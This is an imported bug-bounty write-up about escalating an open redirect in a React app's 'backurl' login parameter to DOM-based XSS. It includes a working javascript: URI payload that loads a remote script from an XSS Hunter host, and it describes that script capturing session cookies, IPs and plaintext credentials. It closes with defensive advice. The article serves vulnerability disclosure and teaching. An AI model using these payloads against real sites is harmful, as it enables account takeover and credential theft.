---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-04-21_smashing-the-modern-web-tech-stack-part-1-the-evolving-threat-landscape-in-2022-.md
original_filename: 2022-04-21_smashing-the-modern-web-tech-stack-part-1-the-evolving-threat-landscape-in-2022-.md
title: 'Smashing the Modern Web Tech Stack — Part 1: The Evolving Threat Landscape
  in 2022 and DOM-based XSS in Cloud-Native React Apps.'
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
- api-security
- idor
- path-traversal
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
- api-security
- idor
- path-traversal
language: en
raw_sha256: dcfd714a2aeabaab0267547baec2c1407fd60ecd10282be095f39d2094194908
text_sha256: e5c6586bce88e2c6ed1a5ce3ae999e8057e23c909508c34baef12b42e98b3fa9
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# Smashing the Modern Web Tech Stack — Part 1: The Evolving Threat Landscape in 2022 and DOM-based XSS in Cloud-Native React Apps.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-04-21_smashing-the-modern-web-tech-stack-part-1-the-evolving-threat-landscape-in-2022-.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse, api-security, idor, path-traversal
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `dcfd714a2aeabaab0267547baec2c1407fd60ecd10282be095f39d2094194908`
- Text SHA256: `e5c6586bce88e2c6ed1a5ce3ae999e8057e23c909508c34baef12b42e98b3fa9`


## Content

---
title: "Smashing the Modern Web Tech Stack — Part 1: The Evolving Threat Landscape in 2022 and DOM-based XSS in Cloud-Native React Apps."
url: "https://medium.com/@malwarejoe/smashing-the-modern-web-tech-stack-part-1-the-evolving-threat-landscape-in-2022-and-dom-based-324696684239"
authors: ["MalwareJoe"]
bugs: ["Open redirect", "XSS"]
publication_date: "2022-04-21"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2692
scraped_via: "browseros"
---

# Smashing the Modern Web Tech Stack — Part 1: The Evolving Threat Landscape in 2022 and DOM-based XSS in Cloud-Native React Apps.

MalwareJoe
 highlighted

Smashing the Modern Web Tech Stack — Part 1: The Evolving Threat Landscape in 2022 and DOM-based XSS in Cloud-Native React Apps.
MalwareJoe
Follow
15 min read
·
Apr 22, 2022

41

This is the first post in a series called ‘Smashing the Modern Web Tech Stack.’ Web Applications today are more complex than ever. I’m writing this series to organize and process some core ideas and questions that I’ve meditated on for a while regarding the contemporary state of web security. Trends in web technology such as the rise of public cloud-delivery, steady adoption of serverless microservice architectures, and the growing predominance of virtual-DOM oriented front-end frameworks have made things more complicated for offensive security engineers. I would argue that many of the tried-and-true offensive tools and methodologies for approaching web that were established in learning communities such as TryHackMe, HackTheBox, or in lab-based certification courses such as the PWK/OSCP are not well-equipped to deal with the modern threat landscape. Today’s offensive playbook must take into account the ways the attack surface of modern web applications is shifting and evolving. The more we understand about modern web tech stacks, the more effective our enumeration will be against them. Part 1 of this series will take a deep dive into leveraging DOM-based XSS in a cloud-native React.js application. This includes a real-world DOM-based XSS vulnerability that I discovered in the wild. I demonstrate this vulnerability could be exploited to steal plain-text credentials and take over end-users accounts.

Brief Primer on the Evolution of the Modern WebApp Tech Stack

One major evolution in web technologies over the last couple decades was the shift from the early days where nodes served websites built from static HTML. Today, websites are complex applications that generate and assemble dynamic content and interface asynchronously with an ever-growing menu of cloud-based services. While the server-side heavy LAMP stack (Linux, Apache MySQL, PHP) still rules legacy web environments, today’s modern web applications are more commonly being built on the MEAN stack (MongoDB, Express, Angular, Node) or some variation of it.

Press enter or click to view image in full size

The accelerated growth of web development in the last few years have given rise to popular trends such as ‘serverless’ functions that host websites and REST API Gateways, the adoption of micro-service architectures in cloud-based apps, Single-Page Applications (SPAs) built using UX-oriented front-end frameworks like Vue or React, and the integration of DevOps practices at every level of the project life cycle. It’s undeniable that these changes have made the battle-tested offensive security tactics, techniques, and methodologies thoroughly established on CTF platforms such as HackTheBox or lab-based certification courses such as the PWK/OSCP feel a little dated, or at-least far removed from contemporary industry trends.

The sun is slowly setting on the glory days of stumbling over raw-SQL queries while fuzzing URL parameters, reading sensitive data via LFI vulnerabilities, or uploading a PHP web shell as your avatar for RCE. Even tried-and-true auto-enumeration tools such as Portswigger’s Burp Suite or OWASP’s ZAP are ill-prepared to deal with web applications built on a modern tech stack. Many industry experts have also noted the ways that offense has fallen behind the innovations in web technologies. Many argue that this rapid evolution in the modern web application tech stack has created a knowledge gap for penetration testers that urgently needs filling. Nonetheless, the growing complexity of such environments creates unique opportunities to reflect on what new offensive tactics, techniques, and procedures must be developed to effectively conduct black-box web application security assessments.

This article specifically grapples with the adoption of UX-oriented modern front-end frameworks such as React.js as they are becoming a de facto-industry standard. These modern front-end frameworks create a smoother user-experience by reversing the traditional compute-heavy load on web servers. This means that instead of being served content from a web server that sends an entire page for every single user request, modern web apps tend to be client-side heavy with React’s Virtual DOM doing a lot of the performance intensive lifting. React apps typically use Javascript to interface with REST APIs that serve something simple like a JSON payload to update the front-end’s UI-components via manipulating the browser’s DOM.

Cloud-Native React.js Security Features and Rethinking Web Attack Surfaces

There is a popular notion these days that React’s default security features eliminate XSS as an attack vector against modern web applications.

Common misconception on Twitter — From site noxssinreact.com

There are indeed a variety of security features that React implements by default. At a high-level, React helps developers avoid XSS vulnerabilities by escaping user-controlled input before being rendered in the browser . This is a very powerful security measure that has been quite successful in defending against XSS in React applications.

Press enter or click to view image in full size
Found this clear summary on Twitter. Post is here.

Beyond the built-in security features of the React framework, cloud-native React applications are typically built with a micro-service architecture. This micro-service model can be understood in contrast to traditional monolithic architecture where there is a centralized web-controller (usually LAMP) almost completely in-charge of service delivery and function execution. This shift in preference from old school LAMP virtual private servers to ‘serverless’ cloud-oriented tech stacks is one of the many changes that is forcing offensive security engineers to reimagine modern threat modeling in their vulnerability assessments. Small shifts in one area can mean big changes for everything from executing the typical phases of enumeration in an offensive engagement to staging successful server-side attacks.

Using Chrome’s extension for web developers makes it simple to determine the type of front-end framework a web application is using. For example, the React Developer Tool Chrome extension appears this way when React is not being used.

Press enter or click to view image in full size
No React in Production

While when React is being used, this is what it looks like.

Yes React in Production

You can use the React Developer Tool to also determine the version of React that is running.

React Version

In the next sections, I will discuss a real-world example of a DOM-based XSS vulnerability that I discovered in the wild and what it might teach us about more generally about approaching black-box penetration testing for modern web application stacks.

Finding an Open-Redirect Vulnerability in a Private Bug Bounty Program

The following real-world example is shared with permission from the private bug bounty program that I discovered the vulnerability in. Organization Identifying Information has been redacted. I chose this example because the web app in question is a good example of a common modern tech stack. At a high-level, this website uses React.js as a front-end framework and is hosted on ‘serverless’ cloud infrastructure (Google’s Firebase Platform).

While enumerating a login prompt, I noticed a parameter, ‘backURL’.

Press enter or click to view image in full size
URL for Login Prompt
Login Prompt Proper

The default value for backurl parameter was:

https%3A%2F%2Fmy.DOMAIN%2Fsettings%2Fprofile

or URL decoded:

https://my.DOMAIN/settings/profile

This parameter appeared to redirect the user to their profile dashboard once authenticated.

After the user logged in, they were taken to their profile dashboard @ https://my.DOMAIN/seettings/profile

So as an experiment, I replaced the default backurl parameter value with the Google homepage.

Press enter or click to view image in full size
Replaced backurl parameter with https://google.com

And indeed after authentication, I was redirected to Google.com

Press enter or click to view image in full size
I’m feeling really lucky now

So let’s pause for a second and talk about scenario-building in bug bounty or pentest reports. By scenario-building, I mean succinctly describing and demonstrating the attack-chain a motivated threat-actor could execute to maximize the destructive impact of a security vulnerability. This is a crucial skill in any pentest or bug bounty report writing. This is especially true for open-redirection vulnerabilities as most bug bounty programs only accept it as an eligible finding if you can prove a security impact beyond a potential phishing redirection page for the most unsavvy end-users.

Press enter or click to view image in full size
Example response to an open-direction vulnerability report on Bugcrowd
Press enter or click to view image in full size
Bugcrowd’s VRT rates these type of vulnerabilities as P5, informational, or P4, basically the lowest level of priority.

What this tells us is that we are going to need a way to escalate the open-redirect vulnerability into a more serious security issue that would have a compelling scenario of compromise for those triaging the report.

Quick and Dirty XSS Overview

Before I go further into the example at-hand, I want to give a quick overview of XSS attacks. Typically, XSS works by injecting malicious Javascript into a user-controlled parameter. This malicious Javascript is rendered and executed in a victim’s browser.

There are three classes of XSS attacks. From Portswigger’s XSS info page:

- Reflected XSS, where the malicious script comes from the current HTTP request.

- Stored XSS, where the malicious script comes from the website’s database.

- DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.

As described above, one of the main differences between reflected or stored XSS vis-a-vis DOM-based XSS is that the latter is a client-side oriented attack that occurs entirely in the browser rather than a payload interfacing with server-side processes. DOM-based XSS is intended for client-side execution to ultimately target the end-users of an application.

One last important concept for DOM-based XSS is the notion of sources and sinks. Simply put, a source is input for untrusted data while a sink executes untrusted data. There are no shortage of resources that go in-depth on the subject of sources and sinks in DOM-based XSS so we will keep it brief for this section. But understanding the mechanics of sources and sinks will aid in understanding the latter sections of this article.

Going Beyond Popping an Alert and Using XSS Hunter

After discovering the open-redirect vulnerability and confirming the web application utilized React, I then tried injecting Javascript into the backurl parameter using the classic XSS payload <script>alert(1)</script>.

URL for Javascript injection test

But nothing out of the ordinary happened once authenticated. After some googling, I tried to pop the alert with a new payload that used the Javascript pseudo URI format.

javascript:alert(1)

This time after authenticating, the page pops the alert. Many bug bounty hunters would stop here. You popped an alert on the page and proved you can run arbitrary Javascript. What more could you want?

Press enter or click to view image in full size
This is when you know things could get exciting

There are two main issues with that approach:

The possibility of other mitigating measures being in place that block the most severe XSS scenarios.
The triage team reviewing your report may not find your alert box compelling. Sure, its neat but an alert box in and of itself doesn’t clearly demonstrate the magnitude of the potential business impact on a client.

I recommend that bug bounty hunters go beyond the standard alert(1) box as a proof of concept for XSS exploits in their reports. Liveoverflow has a great video explaining in more detail why popping an alert box is a bad proof of concept to demonstrate. The better way to demonstrate impact is by finding a way to leverage XSS into credential theft or sensitive data exposure (remember to only test against your own account). For this task, I used a free, online tool called XSS Hunter.

Get MalwareJoe’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I first found out about XSS Hunter from 
STÖK
’s presentation on bug bounty hunting at HackTheBox’s Holiday Hacking Party in Dec. 2021.

Press enter or click to view image in full size
STÖK doing his thing

XSS Hunter is an excellent tool for bug bounty hunters because it makes it easy to demonstrate business impact without the overhead of deploying C2 infrastructure or writing your own custom Javascript payloads. Under the ‘Payloads’ tab in XSS Hunter, they have a variety of examples that use a special xss.ht short-domain to host XSS probes connected to your account.

Press enter or click to view image in full size
Payload tab with xss.ht subdomain redacted

Even if you don’t use the default payloads , you can use your assigned sub-domain to deploy and track any parameters that you’re testing XSS for.

From Open Redirect to Complete Account Takeover via DOM-Based XSS

Given its a React web application, I considered attacks that targeted the browser’s DOM, I crafted a simple payload that would append an XSS Hunter Javascript dropper as a DOM element.

https%3A%2F%2FDOMAIN%2Flogin%3Fbackurl%3Djavascript%3A(function%20()%20%7B%20var%20x%3D%20document.createElement(%22script%22)%3B%20x.src%20%3D%20%22https%3A%2F%2F>REACTED<.xss.ht%22%3B%20document.body.appendChild(x)%3B%20%7D)()%3B

Here’s the non-URL encoded payload:

javascript:(function () { var x= document.createElement(“script”); x.src = “https://>REDACTED<.xss.ht”; document.body.appendChild(x); })();

After authentication, the page seemed to hang but my avatar (redacted in screenshot) updated and confirmed that I successfully logged in.

Press enter or click to view image in full size
Log-in prompt post authentication

I checked my ‘XSS Payload Fires’ tab on XSS Hunter and confirmed that executing arbitrary Javascript from external domains was possible.

Press enter or click to view image in full size
XSS Payloads Fire page on XSS Hunter

Clicking the button ‘View Full Report’ will show a screenshot of the webpage when the payload was fired, the vulnerable page’s URL, origin-domain, the public IP address of the victim’s device, the victim’s user-agent, their session-cookies, and the raw-code of the DOM.

XSS Hunter can tell you your victim’s IP Address
Press enter or click to view image in full size
And their user-agent and session cookies

Inspecting the page elements revealed the original Javascript dropper successfully appended the malicious Javascript payload hosted on an external domain to the browser’s DOM.

External domain hosting malicious Javascript is confirmed loaded into the DOM

Things are going well! To summarize so far, we’ve demonstrated that the backurl parameter is vulnerable to open-redirects, and DOM-based XSS, even when serving payloads from an external domain. This could leak sensitive information such identifying a given user’s IP address, the victim’s user-agent which likely includes the type of device they are on and the browser they are using, any session-cookies that are in their initial HTTP request, and a rendering of the browser’s DOM post-code execution.

This much more persuasively demonstrates the real business impact of the vulnerability. It may be important in reports to emphasize how session-cookies could be used to hijack or ride a user’s session or how info leaked in the user-agent header can be used to determine and serve a secondary payload crafted for the victim’s device environment. Additionally, an attacker could potentially bypass security features that are monitoring suspicious login activity by spoofing device/browser type or geographic location gleaned from leaking the victim’s typical user-agent or IP address. The real severity of the business impact is illuminated if you consider this vulnerability in conjunction with a browser-escape exploit + reverse shell payload. This would allow an attacker to gain remote code execution on the victim’s device.

Finally, to top it off, upon investigation of the extracted DOM, I saw my login credentials in plain-text. It conclusively proved this XSS exploit could be used to swipe credentials for a clean-account take over.

😱
Post-Mortum: Technical Deep-Dive on the Root Cause

Let’s begin by breaking down the vulnerable source code. Although the mini-fied Javascript was difficult to decipher at-first, I found a few code sections that directly referenced the ‘backurl’ parameter. This one caught my attention the most.

Function l() with ‘backurl’ parameter

To be honest, this syntax was initially quite confusing to me. Luckily, some friends who are much more experienced at Javascript than myself pointed out that this was a ternary operation. Simply put, a ternary operation is a conditional statement that is formatted as follows:

condition ? option1 : option2

If the conditional statement is “truthy”, option1 is executed; if the conditional statement is “falsy”, option 2 is executed (Here’s a great explanation of “truthy/falsy” and ternary operations if you were also confused at-first like me).

Press enter or click to view image in full size
“Unminified” Javascript from JSNice

I also used an online tool called JSNice to “unminify” the source-code. It’s far from perfect. “Unminifying” is actually impossible without a mapping for the minified source code (which the developers in this case removed from public view). But it is occasional insightful and at the very least makes the process of reviewing minified source code slightly less disorienting.

With JSNice and ternary conditional syntax in mind, let’s take another look at the potentially vulnerable function step-by-step.

Line-by-line break-down of ternary operation

Cool, this seems a lot more manageable. ‘isLogin’ here seems to infer that ‘p.a.’ is referencing an object connected to a user calling the function. It seems intuitive when given the attribute name ‘isLogin’ to conclude the ternary operation evaluates which option to execute based on whether or not the user is currently logged in. But can we be more sure? Especially in situations where it might not be as obvious?

One way is to look for earlier versions of the source code from Internet Archive’s Way Back Machine. I’ll write an article in the near future about the greatness of the Way Back Machine for passive reconnaissance. Today, I’ll give a quick example of how it helped me gain a clearer picture of the XSS attack vector.

During my recon, I used GoBuster to conduct sub-domain discovery. I found a ‘test’ sub-domain (test.domain.tld) which seemed promising.

Press enter or click to view image in full size
Gobuster output for sub-domain enumeration

And then I used the Way Back Grabber, a Python wrapper for the Way Back Machine to find some old source code for the webapp.

Press enter or click to view image in full size
Waybackgrabber

I then began looking through the archived source codes for the webapp.

Press enter or click to view image in full size

I found this old snippet that’s no longer available in the production site. It seemed promising and was much easier to follow. Other attributes such as ‘userInfo,’ ‘platforms,’ ‘isInited,’ or ‘userInfo.kh_hash_id ’ seemed to confirm more concretely that ‘isLogin’ is an attribute of a class related to user profiles.

Way Back Machine is excellent

Now let’s take a look at the two potential options.

window.location.href = “//”.concat(p.c.appDomain, “/”).concat(t)

For the first, if l() is called by a user who is logged in, it redirects the user to the homepage via the Window Location Href DOM property.

(t = “https://”.concat(p.c.appDomain, “/”).concat(t), e(“/login” + “?backurl=”.concat(encodeURIComponent(t))))

Conversely, when a user calls l() without being logged in, it appears to redirect users to the ‘/login?backurl=’ endpoint that I originally began with. Here it becomes obvious what’s wrong. Values injected into the backurl parameter are defined as variable ‘t’ at run-time. This explains why a user who successfully authenticates without manipulating the backurl parameter are redirected to their dashboard at the /settings/profile endpoint, its the default URI for variable ‘t’. The issue is that in this case, an anonymous user can change that to any value they want.

Parameters that accept untrusted input for the window.location.href DOM property are particularly dangerous because browsers treat what follows the Javascript pseudo URI format as executable code. In this sense, the window.location.href DOM property is both a source and a sink in the discovered vulnerability. Malicious Javascript is injected into the window.location.href property as a source via the backurl parameter and executed when the ‘isLogin’ property is true.

Wowza!
Concluding Thoughts

This article’s example of DOM-based XSS in a cloud-native react web app is instructive both for attackers and defenders.

For the Blue team:

Be aware of how industry-scale web scraping services such at the Way Back Machine are always watching. Any time you push code to production, assume its public forever.
Remember to sanitize, escape, encode, and overall distrust all input sources your users control — in this case, there’s a few things that were recommended. This included regex filters for dangerous characters as well as whitelisting only https://>real_domain_here< for valid backurl parameters.
Leverage modern browser protection mechanisms like CSP headers or CORS policies. These type of mitigations should often significantly limit the impact of viable XSS vectors by restricting the ability for an attacker to exfiltrate data or execute payloads from external domains.
Use built-in React functions to HTML encode any untrusted user input that might render in the browser. This ensures that even if an adversary is able to bypass the security features recommended above, any code injected into a vulnerable parameter won’t execute.

For the Red team:

Reconsider your approach in 2022 — automated tooling and offensive methodology is underdeveloped currently for modern web applications. Those of you who have experience in lab-environments such as HackTheBox or PWK may have experienced a lot of frustration in your first bug bounty attempt. Don’t be afraid to get your hands dirty diving deep into source code review and learning as much as possible about the tech stack you’re targeting from a developers perspective.
Spend more time with your browser’s web development tool enumerating manually and the intercept tab on Burp instead of leaning on Burp’s Repeater and Intruder. The Community version of Burp is largely unequipped to deal with DOM-oriented front-end frameworks and thus requires more intentional exploration to be successful.
The href attribute can be just as dangerous as the eval() function. Start looking for it in devtools and source code review as a low-hanging fruit to enumerate with massive upside potential.
Use proper tools and techniques to demonstrate the magnitude of the vulnerabilities you find. XSS Hunter is available both online and for self-hosting to do the heavy-lifting for you
